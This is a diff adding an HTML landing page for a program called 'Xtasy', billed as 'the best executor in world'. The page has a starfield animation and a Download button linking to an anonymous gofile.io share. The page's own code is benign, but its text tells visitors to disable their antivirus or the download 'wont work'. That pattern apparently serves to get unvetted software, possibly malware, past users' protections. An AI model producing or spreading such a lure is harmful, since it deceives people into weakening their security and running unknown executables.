@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Xtasy</title>
+    <style>
+        /* Basic reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* Full screen setup */
+        body, html {
+            height: 100%;
+            width: 100%;
+            overflow: hidden;
+            background-color: black;
+            position: relative;
+        }
+
+        /* Centering content using Flexbox */
+        .content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            text-align: center;
+        }
+
+        .content h1 {
+            font-size: 3rem;
+            margin-bottom: 20px;
+        }
+
+        .content button {
+            font-size: 1.5rem;
+            color: #fafafa;
+            text-transform: uppercase;
+            padding: 10px 20px;
+            border-radius: 10px;
+            border: 2px solid #fafafa;
+            background: black;
+            box-shadow: 3px 3px #fafafa;
+            cursor: pointer;
+            margin: 35px 0;
+        }
+
+        .content button:active {
+            box-shadow: none;
+            transform: translate(3px, 3px);
+
+        }
+
+        /* Animation setup for the stars */
+        .star {
+            position: absolute;
+            border-radius: 50%;
+            background-color: white;
+            opacity: 0;
+            animation: twinkle 1.5s infinite alternate;
+        }
+
+        /* Create twinkling effect */
+        @keyframes twinkle {
+            0% { opacity: 0.2; }
+            50% { opacity: 1; }
+            100% { opacity: 0.2; }
+        }
+
+        /* Space effect (background) */
+        .star-field {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+        }
+
+    </style>
+</head>
+
+
+<body>
+    <!-- Container for the stars -->
+    <div class="star-field" id="star-field"></div>
+
+    <!-- Centered content with text and button -->
+    <div class="content">
+        <h1 style="font-family: Arial;">Xtasy the best executor in world</h1>
+        <h3 style="margin-bottom: 30px;">You need to disable anti virus or it wont work</h3>
+        <a href="https://gofile.io/d/Dmq7NE"><button>Download</button></a>
+    </div>
+
+    <script>
+        // Generate stars randomly in the background
+        function generateStars() {
+            const starField = document.getElementById('star-field');
+            const numStars = 200; // Number of stars
+
+            for (let i = 0; i < numStars; i++) {
+                const star = document.createElement('div');
+                star.classList.add('star');
+
+                // Set random positions for each star
+                const x = Math.random() * window.innerWidth;
+                const y = Math.random() * window.innerHeight;
+                const size = Math.random() * 3 + 1; // Random size from 1px to 3px
+                const delay = Math.random() * 2; // Random animation delay
+
+                star.style.width = `${size}px`;
+                star.style.height = `${size}px`;
+                star.style.left = `${x}px`;
+                star.style.top = `${y}px`;
+                star.style.animationDelay = `${delay}s`;
+
+                // Append star to the star field
+                starField.appendChild(star);
+            }
+        }
+
+        // Call the function to generate the stars
+        generateStars();
+    </script>
+</body>
+</html>
